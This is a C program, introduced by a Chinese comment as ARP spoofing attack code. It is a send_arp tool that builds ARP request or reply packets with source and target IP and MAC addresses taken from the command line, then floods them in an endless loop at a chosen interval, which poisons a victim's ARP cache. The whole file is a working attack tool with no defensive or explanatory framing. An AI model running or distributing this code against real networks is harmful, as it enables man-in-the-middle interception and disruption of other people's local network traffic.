//一个arp欺骗攻击的代码如下：
/* 
This program sends out ARP packet(s) with source/target IP 
and Ethernet hardware addresses supplied by the user.
*/

#include <unistd.h>
#include <ctype.h>
#include <stdlib.h>
#include <netdb.h> 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <stdio.h> 
#include <errno.h> 
#include <sys/ioctl.h> 
#include <net/if.h> 
#include <signal.h> 
#include <netinet/ip.h> 
#include <netinet/in.h> 
#include <string.h> 
#include <arpa/inet.h> 
#include <netinet/ip_icmp.h> 
//#include <linux/if_ether.h> 

#define ETH_HW_ADDR_LEN 6  
#define IP_ADDR_LEN 4  
#define ARP_FRAME_TYPE 0x0806  
#define ETHER_HW_TYPE 1  
#define IP_PROTO_TYPE 0x0800  
//#define OP_ARP_REQUEST 2  
#define OP_ARP_QUEST 1
#define OP_ARP_REPLY 2  
#define DEFAULT_DEVICE "eth0"  
#define ETH_P_RARP      0x8035		/* Reverse Addr Res packet	*/
#define ETH_P_ARP	0x0806
#define SOCK_DCCP SOCK_DCCP
#ifndef SOCK_PACKET
    #define SOCK_PACKET 10
#endif
char usage[] = {"send_arp: sends out custom ARP packet. \n"
    "usage: send_arp src_ip_addr src_hw_addr targ_ip_addr tar_hw_addr msg_type sleep_us"};  


struct arp_packet
{
    u_char targ_hw_addr[ETH_HW_ADDR_LEN];  
    u_char src_hw_addr[ETH_HW_ADDR_LEN];  
    u_short frame_type;  
    u_short hw_type;  
    u_short prot_type;  
    u_char hw_addr_size;  
    u_char prot_addr_size;
    u_short op;
    u_char sndr_hw_addr[ETH_HW_ADDR_LEN];  
    u_char sndr_ip_addr[IP_ADDR_LEN];  
    u_char rcpt_hw_addr[ETH_HW_ADDR_LEN];  
    u_char rcpt_ip_addr[IP_ADDR_LEN];  
    u_char padding[18];  
};  

void die (const char *);  
void get_ip_addr (struct in_addr *, char *);  
void get_hw_addr (u_char *, char *);  

int main (int argc, char * argv[])  
{  
    struct in_addr src_in_addr, targ_in_addr;  
    struct arp_packet pkt;  
    struct sockaddr sa;  
    int sock;  
    int j;
    if (argc != 7)
        die(usage);

    sock = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP));  
    if (sock < 0)
    {
        perror("socket");
        exit(1);
    }


    pkt.frame_type = htons(ARP_FRAME_TYPE);  
    pkt.hw_type = htons(ETHER_HW_TYPE);  
    pkt.prot_type = htons(IP_PROTO_TYPE);  
    pkt.hw_addr_size = ETH_HW_ADDR_LEN;  
    pkt.prot_addr_size = IP_ADDR_LEN;
    pkt.op = htons(atoi(argv[5]));
    //pkt.op = htons(OP_ARP_QUEST);
    //pkt.op = htons(OP_ARP_REPLY);
    get_hw_addr(pkt.targ_hw_addr, argv[4]);
    get_hw_addr(pkt.rcpt_hw_addr, argv[4]);
    get_hw_addr(pkt.src_hw_addr, argv[2]);
    get_hw_addr(pkt.sndr_hw_addr, argv[2]);
    get_ip_addr(&src_in_addr, argv[1]);
    get_ip_addr(&targ_in_addr, argv[3]);
    memcpy(pkt.sndr_ip_addr, &src_in_addr, IP_ADDR_LEN);  
    //memset(pkt.sndr_ip_addr, 0, IP_ADDR_LEN);  
    memcpy(pkt.rcpt_ip_addr, &targ_in_addr, IP_ADDR_LEN);  
    bzero(pkt.padding,18);
    strcpy(sa.sa_data, DEFAULT_DEVICE);
    while (1)
    {
        if (sendto(sock,&pkt,sizeof(pkt),0,&sa,sizeof(sa)) < 0)
        {
            perror("sendto");
            printf("sleep\n");
            sleep(2);
            //        exit(1);  
        }
        if (argc >= 7)
        {
            usleep(atoi(argv[6]));
        }
    } 
    exit(0);  
} 

void die (const char *str)  
{  
    fprintf(stderr,"%s\n",str);  
    exit(1);
}  

void get_ip_addr(struct in_addr *in_addr, char *str)
{
    struct hostent *hostp;  
    in_addr->s_addr = inet_addr(str);  
    if (in_addr->s_addr == -1)
    {
        if ((hostp = gethostbyname(str)))
            bcopy(hostp->h_addr, in_addr, hostp->h_length);
        else
        {
            fprintf(stderr, "send_arp: unknown host %s\n", str);  
            exit(1);  
        }  
    }
} 

void get_hw_addr (u_char *buf, char *str)  
{  
    int i;
    char c, val;
    for (i = 0; i < ETH_HW_ADDR_LEN; i++)
    {
        if (!(c = tolower(*str++)))
            die("Invalid hardware address");
        if (isdigit(c))
            val = c - '0';
        else if (c >= 'a' && c <= 'f')
            val = c-'a'+10;
        else
            die("Invalid hardware address");
        *buf = val << 4;
        if (!(c = tolower(*str++)))
            die("Invalid hardware address");
        if (isdigit(c))
            val = c - '0';
        else if (c >= 'a' && c <= 'f')
            val = c-'a'+10;
        else
            die("Invalid hardware address");  
        *buf++ |= val;  
        if (*str == ':')
            str++;
    }  
} 
